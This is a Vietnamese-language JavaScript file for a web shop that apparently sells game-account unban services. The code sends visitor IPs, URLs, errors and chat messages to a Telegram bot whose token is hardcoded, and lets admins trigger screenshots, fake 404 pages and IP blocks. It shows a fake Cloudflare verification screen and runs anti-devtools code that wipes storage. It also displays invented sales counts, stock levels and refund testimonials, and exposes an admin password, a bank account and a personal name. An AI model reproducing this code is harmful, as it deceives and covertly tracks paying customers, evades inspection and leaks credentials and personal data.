// ============================================
// DEVILS WILL RISE v13.3 - FULL FIX + ERROR MONITORING
// Owner: @UnknownGuy9876 | Channel: @SGCodexs
// ============================================

var TELEGRAM_BOT_TOKEN = '8980322724:AAEbExHdPUgFMKjnSryNhcH4jvE5gMYCGHo';
var TELEGRAM_CHAT_ID = '8742603540';
var ADMIN_PRIVATE_CHAT_ID = '8742603540';
var TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;

// ============================================
// ERROR MONITORING - TỰ ĐỘNG BÁO LỖI VỀ TELEGRAM
// ============================================
var errorLog = [];
var MAX_ERROR_LOG = 20;
var lastErrorReportTime = 0;
var ERROR_REPORT_COOLDOWN = 10000;

function reportErrorToTelegram(errorData) {
    var now = Date.now();
    if (now - lastErrorReportTime < ERROR_REPORT_COOLDOWN) return;
    lastErrorReportTime = now;
    
    var msg = '🚨 <b>LỖI PHÁT HIỆN</b>\n';
    msg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
    msg += '📝 ' + (errorData.message || 'Unknown error') + '\n';
    if (errorData.source) msg += '📍 ' + errorData.source + '\n';
    if (errorData.line) msg += '📌 Line: ' + errorData.line + '\n';
    msg += '🌐 IP: ' + (userIP || 'N/A') + '\n';
    msg += '🔗 URL: ' + window.location.href;
    
    fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'HTML'
        })
    }).catch(function() {});
}

window.addEventListener('error', function(event) {
    var errorData = {
        message: event.message,
        source: event.filename ? event.filename.split('/').pop() : 'unknown',
        line: event.lineno,
        col: event.colno,
        time: new Date().toISOString()
    };
    errorLog.push(errorData);
    if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
    reportErrorToTelegram(errorData);
    console.error('❌ Error:', errorData);
});

window.addEventListener('unhandledrejection', function(event) {
    var errorData = {
        message: event.reason ? (event.reason.message || String(event.reason)) : 'Unhandled Promise Rejection',
        source: 'promise',
        time: new Date().toISOString()
    };
    errorLog.push(errorData);
    if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
    reportErrorToTelegram(errorData);
    console.error('❌ Unhandled Rejection:', errorData);
});

function captureAndReportError(fn, context) {
    return function() {
        try {
            return fn.apply(this, arguments);
        } catch (e) {
            var errorData = {
                message: e.message,
                source: context || 'wrapped-function',
                time: new Date().toISOString()
            };
            errorLog.push(errorData);
            if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
            reportErrorToTelegram(errorData);
            console.error('❌ Caught Error:', errorData);
        }
    };
}

function safeExecute(fn, fallback, context) {
    try {
        return fn();
    } catch (e) {
        var errorData = {
            message: e.message,
            source: context || 'safe-execute',
            time: new Date().toISOString()
        };
        errorLog.push(errorData);
        if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
        reportErrorToTelegram(errorData);
        return typeof fallback === 'function' ? fallback() : fallback;
    }
}

// ============================================
// CENTRALIZED TELEGRAM POLLING
// ============================================
var GLOBAL_POLLING_ACTIVE = false;
var GLOBAL_POLLING_OFFSET = 0;
var GLOBAL_POLLING_LOCK = false;
var GLOBAL_POLLING_DELAY = 3000;
var currentSentMessageId = null;
var currentOrderIdForPolling = null;

function sleep(ms) {
    return new Promise(function(resolve) { setTimeout(resolve, ms); });
}

async function centralizedGetUpdates() {
    if (GLOBAL_POLLING_LOCK) return null;
    GLOBAL_POLLING_LOCK = true;
    try {
        var res = await fetch(TELEGRAM_API + '/getUpdates?offset=' + GLOBAL_POLLING_OFFSET + '&timeout=5');
        if (res.status === 409) { GLOBAL_POLLING_LOCK = false; return null; }
        var data = await res.json(); GLOBAL_POLLING_LOCK = false; return data;
    } catch (e) { GLOBAL_POLLING_LOCK = false; return null; }
}

async function centralizedPollingLoop() {
    if (GLOBAL_POLLING_ACTIVE) return;
    GLOBAL_POLLING_ACTIVE = true;
    
    while (true) {
        if (GLOBAL_POLLING_LOCK) { await sleep(500); continue; }
        var data = await centralizedGetUpdates();
        if (!data || !data.ok || !data.result || !data.result.length) { await sleep(GLOBAL_POLLING_DELAY); continue; }
        
        for (var i = 0; i < data.result.length; i++) {
            var update = data.result[i];
            if (update.update_id >= GLOBAL_POLLING_OFFSET) { GLOBAL_POLLING_OFFSET = update.update_id + 1; }
            
            // Order approval
            if (update.callback_query) {
                var cb = update.callback_query;
                var msgId = cb.message ? cb.message.message_id : null;
                if (currentSentMessageId && msgId === currentSentMessageId) {
                    var cbData = cb.data; var parts = cbData.split('_'); var action = parts[0]; var orderId = parts.slice(1).join('_');
                    if (action === 'approve') {
                        if (selectedSchedule !== 'now') { scheduleOrderProcessing(orderId); } 
                        else { updateOrderStatus(orderId, 'approved'); }
                        playSound('success');
                        fetch(TELEGRAM_API + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: cb.id, text: '✅ Đã duyệt!' }) }).catch(function(){});
                        currentSentMessageId = null; currentOrderIdForPolling = null;
                    } else if (action === 'reject') {
                        sendToTelegram('⚠️ Nhập lý do từ chối cho đơn #' + orderId + '\nReply tin nhắn này với lý do');
                        currentOrderIdForPolling = orderId;
                        fetch(TELEGRAM_API + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: cb.id, text: '❌ Đã từ chối!' }) }).catch(function(){});
                        currentSentMessageId = null;
                    }
                }
            }
            
            // Chat + Reject + Bot
            if (update.message && update.message.text) {
                var msg = update.message;
                if (msg.reply_to_message) {
                    var repliedText = msg.reply_to_message.text || '';
                    if ((repliedText.indexOf('Vui lòng nhập lý do') !== -1 || repliedText.indexOf('Nhập lý do') !== -1) && currentOrderIdForPolling) {
                        updateOrderStatus(currentOrderIdForPolling, 'rejected', msg.text || 'Không có lý do'); currentOrderIdForPolling = null;
                    }
                }
                if (msg.reply_to_message) {
                    var repliedText2 = msg.reply_to_message.text || '';
                    if (repliedText2.indexOf('Chat từ') !== -1 || repliedText2.indexOf('/chat') !== -1) {
                        var text = msg.text || ''; var chatMatch = text.match(/^\/chat\s+(\S+)\s+(.+)$/);
                        if (chatMatch && chatMatch[1] === userIP) { displayAdminReply(chatMatch[2]); playSound('notification'); }
                    }
                }
                if (!msg.reply_to_message && msg.text.indexOf('/') === 0) { handleTelegramCommand(msg.text); }
                else if (!msg.reply_to_message && autoReplyEnabled && msg.text.indexOf('/') !== 0) { handleAutoReply(msg.text); }
            }
        }
        await sleep(GLOBAL_POLLING_DELAY);
    }
}

function handleTelegramCommand(msg) {
    safeExecute(function() {
        if (msg === '/help' || msg === '/commands' || msg === '/start') {
            sendToTelegram('📋 <b>DANH SÁCH LỆNH ADMIN v13.3</b>\n\n🔒 <b>IP:</b> /block, /unblock, /blocklist, /allowip\n📢 <b>WEB:</b> /broadcast, /maintenance, /fake404, /settitle, /setplan\n👤 <b>USER:</b> /chat, /view\n🎁 <b>CODE:</b> /code\n⏰ <b>SCHEDULE:</b> /schedule\n🤖 <b>BOT:</b> /auto, /stats, /dashboard, /errors\n🔐 <b>ADMIN:</b> /op, /deop\n📟 /help - Xem lại');
        } else if (msg.indexOf('/block ') === 0) { var t = msg.replace('/block ', '').trim(); if (t) sendToTelegram(blockIP(t) ? '🚫 Đã chặn: ' + t : '⚠️ IP đã bị chặn!'); }
        else if (msg.indexOf('/unblock ') === 0) { var t = msg.replace('/unblock ', '').trim(); if (t) sendToTelegram(unblockIP(t) ? '✅ Đã bỏ chặn: ' + t : '⚠️ IP không tồn tại!'); }
        else if (msg === '/blocklist') { if (blockedIPs.length === 0) sendToTelegram('📋 Trống'); else { var l = '📋 IP BỊ CHẶN (' + blockedIPs.length + '):\n'; for (var i = 0; i < blockedIPs.length; i++) l += '🚫 ' + blockedIPs[i] + '\n'; sendToTelegram(l); } }
        else if (msg.indexOf('/view ') === 0) { var v = msg.replace('/view ', '').trim(); if (v === userIP) captureScreenshot(); else sendToTelegram('⚠️ IP không khớp! IP web: ' + userIP); }
        else if (msg.indexOf('/broadcast ') === 0) { var b = msg.replace('/broadcast ', '').trim(); localStorage.setItem('broadcastMessage', b); localStorage.setItem('broadcastActive', 'true'); broadcastMessage = b; broadcastActive = true; checkBroadcast(); sendToTelegram('📢 Broadcast!'); }
        else if (msg === '/broadcast off') { localStorage.setItem('broadcastActive', 'false'); broadcastActive = false; var bn = document.getElementById('broadcastBanner'); if (bn) bn.classList.add('hidden'); sendToTelegram('📢 Tắt'); }
        else if (msg.indexOf('/schedule ') === 0) { var p = msg.replace('/schedule ', '').split(' '); if (p.length >= 2) { scheduledMessages.push({ time: p[0], message: p.slice(1).join(' '), sent: false }); secureSetItem('scheduledMessages', scheduledMessages); sendToTelegram('✅ Lịch: ' + p[0]); } }
        else if (msg === '/maintenance on') { localStorage.setItem('maintenanceMode', 'true'); sendToTelegram('🔧 Bảo trì ON'); }
        else if (msg === '/maintenance off') { localStorage.setItem('maintenanceMode', 'false'); sendToTelegram('✅ Bảo trì OFF'); }
        else if (msg === '/maintenance bypass') { sessionStorage.setItem('adminBypass', 'true'); sendToTelegram('✅ Bypass'); }
        else if (msg === '/fake404 on') { localStorage.setItem('fake404Enabled', 'true'); sendToTelegram('👻 404 ON'); }
        else if (msg === '/fake404 off') { localStorage.setItem('fake404Enabled', 'false'); sendToTelegram('✅ 404 OFF'); }
        else if (msg.indexOf('/allowip ') === 0) { var a = msg.replace('/allowip ', '').trim(); if (a && allowedIPs.indexOf(a) === -1) { allowedIPs.push(a); secureSetItem('allowedIPs', allowedIPs); sendToTelegram('✅ IP an toàn: ' + a); } }
        else if (msg.indexOf('/code ') === 0) { var cp = msg.replace('/code ', '').split(' '); if (cp.length >= 3) { giftCodes[cp[0].toUpperCase()] = { discount: parseInt(cp[1]), maxUses: parseInt(cp[2]), used: 0 }; secureSetItem('giftCodes', giftCodes); sendToTelegram('✅ Code: ' + cp[0]); } }
        else if (msg.indexOf('/op ') === 0) { var op = msg.replace('/op ', '').trim(); if (op && adminPasswords.indexOf(op) === -1) { adminPasswords.push(op); localStorage.setItem('adminPasswords', JSON.stringify(adminPasswords)); sendToTelegram('✅ Admin thêm'); } }
        else if (msg.indexOf('/deop ') === 0) { var dp = msg.replace('/deop ', '').trim(); var idx = adminPasswords.indexOf(dp); if (idx !== -1) { adminPasswords.splice(idx, 1); localStorage.setItem('adminPasswords', JSON.stringify(adminPasswords)); sendToTelegram('✅ Xóa admin'); } }
        else if (msg.indexOf('/settitle ') === 0) { var st = msg.replace('/settitle ', '').trim(); var h1 = document.querySelector('h1'); if (h1) { h1.textContent = st; sendToTelegram('✅ Title: ' + st); } }
        else if (msg.indexOf('/setplan ') === 0) { var sp = msg.replace('/setplan ', '').split(' '); if (sp.length >= 2) { var el = document.querySelector('[data-plan="' + sp[0] + '"]'); if (el) { el.dataset.price = sp[1]; updatePrices(); sendToTelegram('✅ Giá ' + sp[0] + ': ' + sp[1]); } } }
        else if (msg === '/auto on') { autoReplyEnabled = true; sendToTelegram('✅ Auto ON'); }
        else if (msg === '/auto off') { autoReplyEnabled = false; sendToTelegram('❌ Auto OFF'); }
        else if (msg === '/stats') { sendToTelegram('📊 Auto: ' + autoReplyStats.today + ' | Tổng: ' + autoReplyStats.total + ' | IP: ' + userIP + ' | Blocked: ' + blockedIPs.length); }
        else if (msg === '/dashboard') { sendToTelegram('📊 Đơn: ' + todaySoldCount + ' | DT: ~' + (todaySoldCount * 150000).toLocaleString() + 'đ | Online: ' + (document.getElementById('onlineCount') ? document.getElementById('onlineCount').textContent : 'N/A')); }
        else if (msg === '/errors') {
            if (errorLog.length === 0) { sendToTelegram('✅ Không có lỗi nào!'); }
            else { var el = '📋 LỖI GẦN ĐÂY (' + errorLog.length + '):\n'; for (var ei = 0; ei < errorLog.length; ei++) { el += '⚠️ ' + errorLog[ei].message.substring(0, 80) + '\n   ' + errorLog[ei].source + ':' + (errorLog[ei].line || '?') + '\n\n'; } sendToTelegram(el); }
        }
    }, null, 'telegram-command');
}

function handleAutoReply(msg) {
    safeExecute(function() {
        var reply = ''; var lower = msg.toLowerCase();
        if (lower.indexOf('giá') !== -1 || lower.indexOf('tiền') !== -1) reply = '💰 Cơ Bản 150k | VIP 300k | Ultimate 500k | Sub 50k/tháng';
        else if (lower.indexOf('bảo hành') !== -1) reply = '🛡️ Cơ Bản 3 tháng | VIP 6 tháng | Ultimate 12 tháng';
        else if (lower.indexOf('gấp') !== -1 || lower.indexOf('liền') !== -1) reply = '⚡ Ultimate 500k (5-10p) | Cấp Tốc 800k (1-3p)';
        else if (lower.indexOf('thanh toán') !== -1 || lower.indexOf('ck') !== -1) reply = '💳 MB Bank: 0644612345555 - Tran Nguyen Duc Minh';
        else if (lower.indexOf('thời gian') !== -1) reply = '⏱ Cơ Bản 30-45p | VIP 10-15p | Ultimate 5-10p | Cấp tốc 1-3p';
        if (reply) { autoReplyStats.total++; autoReplyStats.today++; sendToTelegram('🤖 ' + reply); }
        if (autoReplyStats.lastReset !== new Date().toDateString()) { autoReplyStats.today = 0; autoReplyStats.lastReset = new Date().toDateString(); }
    }, null, 'auto-reply');
}

function startPollingForApproval(sentMessageId, orderId) {
    currentSentMessageId = sentMessageId; currentOrderIdForPolling = orderId;
    if (state.pollingInterval) clearTimeout(state.pollingInterval);
    state.pollingInterval = setTimeout(function() {
        if (currentSentMessageId === sentMessageId) {
            var rb = document.getElementById('resultBox');
            if (rb) rb.innerHTML = '<div style="color:#f39c12;text-align:center;"><h3>⏳ #' + orderId + '</h3><p>Admin chưa phản hồi, vui lòng chờ...</p></div>';
        }
    }, 600000);
}

function toggleChat() {
    var popup = document.getElementById('chatPopup'); if (!popup) return;
    popup.classList.toggle('hidden');
    if (!popup.classList.contains('hidden')) {
        unreadAdminMessages = 0; var nd = document.getElementById('chatNotificationDot'); if (nd) nd.style.display = 'none';
        var tb = document.getElementById('chatToggleBtn'); if (tb) tb.classList.remove('chat-new-message');
        var ipEl = document.getElementById('chatIPDisplay'); if (ipEl) ipEl.textContent = userIP;
    }
}

function displayAdminReply(message) {
    var messages = document.getElementById('chatMessages'); if (!messages) return;
    var time = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
    var ti = document.getElementById('typingIndicator'); if (ti) ti.classList.add('hidden');
    messages.innerHTML += '<div style="margin-bottom:10px;"><div style="display:inline-block;background:#1d2c45;color:#cfdefa;padding:10px 14px;border-radius:15px 15px 15px 0;max-width:85%;border-left:3px solid #00e6ff;"><small style="color:#00e6ff;font-weight:bold;">👑 Admin:</small><br>' + escapeHtml(message) + '</div><div style="font-size:0.7rem;color:#6c7e9e;">' + time + '</div></div>';
    messages.scrollTop = messages.scrollHeight;
    if (document.getElementById('chatPopup').classList.contains('hidden')) {
        unreadAdminMessages++; var nd = document.getElementById('chatNotificationDot'); if (nd) nd.style.display = 'block';
        var tb = document.getElementById('chatToggleBtn'); if (tb) { tb.classList.add('chat-new-message'); setTimeout(function() { tb.classList.remove('chat-new-message'); }, 3000); }
    }
}

async function sendChat() {
    var input = document.getElementById('chatInput'); if (!input) return;
    var msg = input.value.trim(); if (!msg) return;
    var ipEl = document.getElementById('chatIPDisplay'); if (ipEl) ipEl.textContent = userIP;
    var messages = document.getElementById('chatMessages'); if (!messages) return;
    var time = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
    messages.innerHTML += '<div style="margin-bottom:10px;text-align:right;"><div style="display:inline-block;background:#0077ff;color:white;padding:10px 14px;border-radius:15px 15px 0 15px;max-width:85%;">' + escapeHtml(msg) + '</div><div style="font-size:0.7rem;color:#6c7e9e;">' + time + '</div></div>';
    await sendToTelegram('💬 Chat từ ' + (userNickname || 'User') + '\n🌐 IP: ' + userIP + '\n📝 ' + msg + '\n📌 Reply: /chat ' + userIP + ' nội_dung');
    input.value = ''; messages.scrollTop = messages.scrollHeight;
    var ti = document.getElementById('typingIndicator'); if (ti) { ti.classList.remove('hidden'); setTimeout(function() { ti.classList.add('hidden'); }, 3000); }
}

// ============================================
// Cloudflare
// ============================================
(function() {
    if (!sessionStorage.getItem('cf_verified')) {
        document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#00e6ff;text-align:center;font-family:\'Segoe UI\',sans-serif;"><div><div style="font-size:3rem;animation:cfSpin 2s linear infinite;">🛡️</div><h2 style="margin:20px 0;">Đang kiểm tra bảo mật...</h2><p style="color:#9aa9c1;">Vui lòng chờ trong giây lát</p><div style="width:200px;height:4px;background:#2e405b;border-radius:5px;margin:20px auto;overflow:hidden;"><div id="cfProgress" style="width:0%;height:100%;background:#00e6ff;border-radius:5px;transition:width 0.3s;"></div></div></div></div><style>@keyframes cfSpin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}</style>';
        var cfProgress = document.getElementById('cfProgress'); var cfWidth = 0;
        var cfInterval = setInterval(function() { cfWidth += Math.random() * 15; if (cfWidth >= 100) { cfWidth = 100; if (cfProgress) cfProgress.style.width = '100%'; clearInterval(cfInterval); sessionStorage.setItem('cf_verified', 'true'); location.reload(); } if (cfProgress) cfProgress.style.width = cfWidth + '%'; }, 400);
        return;
    }
})();

// ============================================
// Anti-Debugger
// ============================================
(function() {
    var devtoolsOpen = false; var threshold = 160;
    setInterval(function() { var w = window.outerWidth - window.innerWidth > threshold; var h = window.outerHeight - window.innerHeight > threshold; if (w || h) { if (!devtoolsOpen) { devtoolsOpen = true; localStorage.clear(); sessionStorage.clear(); document.body.innerHTML = '<div style="text-align:center;padding:100px;background:#0a0f1e;color:#ff6b6b;font-family:sans-serif;"><h1>🚫 TRUY CẬP BỊ TỪ CHỐI</h1><p>DevTools detected</p></div>'; setTimeout(function() { window.location.href = 'https://www.google.com'; }, 3000); } } else { devtoolsOpen = false; } }, 1000);
})();

// ============================================
// ENCRYPTION - FIXED btoa LATIN1 ERROR
// ============================================
var ENCRYPTION_KEY = 'DWRv13SecretKey!';

function toBinary(str) {
    var encoder = new TextEncoder();
    var bytes = encoder.encode(str);
    var binary = '';
    for (var i = 0; i < bytes.length; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return binary;
}

function fromBinary(binary) {
    var bytes = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return new TextDecoder().decode(bytes);
}

function encryptData(data) {
    try {
        var str = JSON.stringify(data);
        var result = '';
        for (var i = 0; i < str.length; i++) {
            result += String.fromCharCode(str.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length));
        }
        var binary = toBinary(result);
        return btoa(binary);
    } catch (e) {
        reportErrorToTelegram({ message: 'Encrypt error: ' + e.message, source: 'encryptData' });
        return btoa(toBinary(JSON.stringify(data)));
    }
}

function decryptData(encrypted) {
    try {
        var decoded = atob(encrypted);
        var str = fromBinary(decoded);
        var result = '';
        for (var i = 0; i < str.length; i++) {
            result += String.fromCharCode(str.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length));
        }
        return result;
    } catch (e) {
        return encrypted;
    }
}

function secureSetItem(key, value) {
    try {
        localStorage.setItem(key, encryptData(value));
    } catch (e) {
        reportErrorToTelegram({ message: 'secureSetItem error: ' + e.message, source: 'storage' });
    }
}

function secureGetItem(key, defaultValue) {
    var raw = localStorage.getItem(key);
    if (!raw) return defaultValue;
    try {
        var decrypted = decryptData(raw);
        return JSON.parse(decrypted);
    } catch (e) {
        try {
            return JSON.parse(raw);
        } catch (e2) {
            return defaultValue;
        }
    }
}

function migrateToSecure() {
    var keys = ['toolHistory', 'blockedIPs', 'blockedFingerprints', 'giftCodes', 'scheduledMessages'];
    for (var i = 0; i < keys.length; i++) {
        var raw = localStorage.getItem(keys[i]);
        if (raw && (raw[0] === '[' || raw[0] === '{')) {
            try {
                var data = JSON.parse(raw);
                secureSetItem(keys[i], data);
            } catch (e) {}
        }
    }
}
migrateToSecure();

// ============================================
// IP Block System
// ============================================
var blockedIPs = secureGetItem('blockedIPs', []);
var blockedFingerprints = secureGetItem('blockedFingerprints', []);
var adminPasswords = JSON.parse(localStorage.getItem('adminPasswords') || '["TLBN9"]');
var allowedIPs = secureGetItem('allowedIPs', []);

async function checkIfBlocked() {
    await fetchUserIP();
    deviceFingerprint = await generateDeviceFingerprint();
    if (blockedIPs.indexOf(userIP) !== -1 || blockedFingerprints.indexOf(deviceFingerprint) !== -1) {
        document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;font-family:\'Segoe UI\',sans-serif;"><div><div style="font-size:5rem;">🚫</div><h1>TRUY CẬP BỊ TỪ CHỐI</h1><p style="color:#9aa9c1;">IP của bạn đã bị chặn.</p></div></div>';
        return false;
    }
    return true;
}
function blockIP(ip) { if (blockedIPs.indexOf(ip) === -1) { blockedIPs.push(ip); secureSetItem('blockedIPs', blockedIPs); return true; } return false; }
function unblockIP(ip) { var index = blockedIPs.indexOf(ip); if (index !== -1) { blockedIPs.splice(index, 1); secureSetItem('blockedIPs', blockedIPs); return true; } return false; }
function blockFingerprint(fp) { if (blockedFingerprints.indexOf(fp) === -1) { blockedFingerprints.push(fp); secureSetItem('blockedFingerprints', blockedFingerprints); return true; } return false; }

var fake404Enabled = localStorage.getItem('fake404Enabled') === 'true';
if (fake404Enabled && allowedIPs.indexOf('*') === -1 && allowedIPs.indexOf(userIP) === -1 && userIP) {
    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;font-family:\'Segoe UI\',sans-serif;"><div><div style="font-size:8rem;">404</div><h1>TRANG KHÔNG TỒN TẠI</h1></div></div>';
}

var suspiciousIPs = ['113.160.', '117.0.', '14.0.'];
function checkSuspiciousIP() { for (var i = 0; i < suspiciousIPs.length; i++) { if (userIP && userIP.indexOf(suspiciousIPs[i]) === 0) { localStorage.clear(); sessionStorage.clear(); document.body.innerHTML = '<div style="text-align:center;padding:100px;color:#ff6b6b;"><h1>🚫 TRUY CẬP BỊ TỪ CHỐI</h1></div>'; sendToTelegram('🚨 IP nghi ngờ: ' + userIP); return false; } } return true; }
var maintenanceMode = localStorage.getItem('maintenanceMode') === 'true';
if (maintenanceMode && !sessionStorage.getItem('adminBypass')) { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ffd966;text-align:center;"><div><div style="font-size:5rem;">🔧</div><h1>ĐANG BẢO TRÌ</h1></div></div>'; }

var lastKnownIP = localStorage.getItem('lastKnownIP') || '';
if (lastKnownIP && lastKnownIP !== userIP && lastKnownIP !== '' && userIP) {
    setTimeout(function() { var ipWarning = document.getElementById('ipWarning'); if (ipWarning) ipWarning.textContent = '⚠️ IP thay đổi! Lần cuối: ' + lastKnownIP.substring(0, 7) + '...'; }, 2000);
    sendToTelegram('⚠️ IP THAY ĐỔI\nCũ: ' + lastKnownIP + '\nMới: ' + userIP);
}
if (userIP) localStorage.setItem('lastKnownIP', userIP);

var giftCodes = secureGetItem('giftCodes', {});
var appliedGiftCode = null;
var giftDiscount = 0;

function applyGiftCode() {
    var codeInput = document.getElementById('giftCodeInput'); var code = codeInput ? codeInput.value.trim().toUpperCase() : '';
    var msgEl = document.getElementById('giftCodeMsg');
    if (!code) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Vui lòng nhập mã!'; } return; }
    var giftData = giftCodes[code];
    if (!giftData) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Mã không tồn tại!'; } return; }
    if (giftData.used >= giftData.maxUses) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#ff6b6b'; msgEl.textContent = 'Mã đã hết lượt!'; } return; }
    if (appliedGiftCode === code) { if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#f39c12'; msgEl.textContent = 'Mã đã áp dụng!'; } return; }
    giftDiscount = giftData.discount; appliedGiftCode = code; giftData.used++; giftCodes[code] = giftData; secureSetItem('giftCodes', giftCodes);
    if (msgEl) { msgEl.style.display = 'block'; msgEl.style.color = '#2ecc71'; msgEl.textContent = '✅ Giảm ' + giftDiscount + '%!'; }
    updatePrices(); Swal.fire({ icon: 'success', title: '🎁 Áp dụng thành công!', text: 'Giảm ' + giftDiscount + '%', timer: 2000 });
}

var scheduledMessages = secureGetItem('scheduledMessages', []);
function checkScheduledMessages() {
    var now = new Date(); var currentTime = now.getHours() + ':' + (now.getMinutes() < 10 ? '0' : '') + now.getMinutes();
    var toKeep = [];
    for (var i = 0; i < scheduledMessages.length; i++) { var sm = scheduledMessages[i]; if (sm.time === currentTime && !sm.sent) { sendToTelegram('📅 TIN NHẮN LÊN LỊCH\n⏰ ' + sm.time + '\n📝 ' + sm.message); sm.sent = true; } if (!sm.sent || sm.time > currentTime) { toKeep.push(sm); } }
    if (toKeep.length !== scheduledMessages.length) { secureSetItem('scheduledMessages', toKeep); scheduledMessages = toKeep; }
}
setInterval(checkScheduledMessages, 30000);

// ============================================
// Global Variables
// ============================================
var userIP = '', deviceFingerprint = '', uploadedImageFile = null, uploadedImageData = null,
    selectedSchedule = 'now', planStocks = { basic: 12, vip: 5, ultimate: 2 };
var unreadAdminMessages = 0, clickCountForSpeed = 0, todaySoldCount = 47, darkMode = false;
var formFilled = false, reminderShown = false, autoReplyEnabled = true;
var autoReplyStats = { total: 0, today: 0, lastReset: new Date().toDateString() };
var securityLog = [];
var userNickname = localStorage.getItem('userNickname') || '';
var userAvatar = localStorage.getItem('userAvatar') || 'default';
var inactivityTimer = null;
var INACTIVITY_TIMEOUT = 30 * 60 * 1000;
var lastBackupDate = localStorage.getItem('lastBackupDate') || '';
var broadcastMessage = localStorage.getItem('broadcastMessage') || '';
var broadcastActive = localStorage.getItem('broadcastActive') === 'true';

var state = { game: 'freefire', server: 'vietnam', platform: 'facebook', paymentMethod: 'bank',
    plan: { name: 'basic', price: 150000, time: '30-45' }, currentOrderId: null, captchaResult: 0,
    countdownInterval: null, pollingInterval: null, scheduleTimer: null };

var sounds = {
    success: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-correct-answer-tone-2870.mp3'),
    error: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-wrong-answer-fail-notification-946.mp3'),
    notification: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3'),
    complete: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3')
};

// ============================================
// Utility Functions
// ============================================
function playSound(t) { safeExecute(function() { if (sounds[t]) { sounds[t].play().catch(function() {}); } }, null, 'playSound'); }
function escapeHtml(text) { var d = document.createElement('div'); d.textContent = text; return d.innerHTML.replace(/\n/g, '<br>'); }
function generateCaptcha() { var a = Math.floor(Math.random() * 10) + 1, b = Math.floor(Math.random() * 10) + 1; state.captchaResult = a + b; var el = document.getElementById('captchaQuestion'); if (el) el.textContent = a + '+' + b; }
function copyToClipboard(text) { navigator.clipboard.writeText(text).then(function() { Swal.fire({ icon: 'success', title: 'Đã sao chép!', timer: 1500, showConfirmButton: false }); }).catch(function() { var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }); }
function togglePasswordVisibility() { var i = document.getElementById('passwordInput'), ic = document.getElementById('togglePassword'); if (!i || !ic) return; if (i.type === 'password') { i.type = 'text'; ic.classList.replace('fa-eye', 'fa-eye-slash'); } else { i.type = 'password'; ic.classList.replace('fa-eye-slash', 'fa-eye'); } }
function toggleDarkMode() { darkMode = !darkMode; document.body.classList.toggle('light-mode', darkMode); var el = document.getElementById('darkModeToggle'); if (el) el.textContent = darkMode ? '☀️' : '🌓'; localStorage.setItem('darkMode', darkMode); }
function showMoneyBackInfo() { Swal.fire({ title: 'CAM KẾT HOÀN TIỀN 200%', html: '<p>Nếu không mở được band, hoàn 200%</p><p>Cần video quay màn hình</p><p style="color:#2ecc71;">Đã có 847 khách hoàn tiền thành công!</p>', icon: 'info', confirmButtonText: 'OK' }); }
function selectSpeedPackage() { state.plan = { name: 'speed', price: 800000, time: '1-3' }; document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); updatePrices(); Swal.fire('⚡', 'Đã chọn Gói Cấp Tốc 800k!', 'success'); }
function selectSubscription() { state.plan = { name: 'subscription', price: 50000, time: '0' }; document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); updatePrices(); Swal.fire('🔄', 'Đã chọn Subscription 50k/tháng!', 'success'); }
function resetProgress() { ['progressDuyet', 'progressXuLy', 'progressDone'].forEach(function(s) { var el = document.getElementById(s); if (el) { el.classList.remove('active'); el.classList.remove('completed'); } }); }
function removeImage() { uploadedImageFile = null; uploadedImageData = null; var fi = document.getElementById('paymentImage'); if (fi) fi.value = ''; var ip = document.getElementById('imagePreview'); if (ip) ip.src = ''; var up = document.getElementById('uploadPlaceholder'); var ipc = document.getElementById('imagePreviewContainer'); if (up) up.style.display = 'block'; if (ipc) ipc.style.display = 'none'; var fa = document.getElementById('fileUploadArea'); if (fa) { fa.style.borderStyle = 'dashed'; fa.style.borderColor = '#3f5580'; } }
function zoomImage() { var s = document.getElementById('imagePreview'); if (s && s.src) Swal.fire({ imageUrl: s.src, showCloseButton: true, showConfirmButton: false, background: '#0a0f1e' }); }
